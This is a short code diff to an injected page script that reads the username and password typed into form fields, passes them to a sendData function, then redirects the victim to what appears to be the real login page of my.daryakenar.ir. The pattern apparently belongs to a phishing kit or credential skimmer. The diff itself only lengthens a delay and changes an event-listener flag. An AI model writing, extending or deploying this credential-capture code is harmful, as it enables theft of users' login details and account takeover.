@@ -32,11 +32,11 @@
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
                     if(password.length > 2){
-                        await delay(3000);
+                        await delay(5000);
                         parent.location.href = 'https://my.daryakenar.ir/account/login/mobile';
                     }
                 }
-            }, true);
+            }, false);
         `;
         doc.body.appendChild(script);
     };
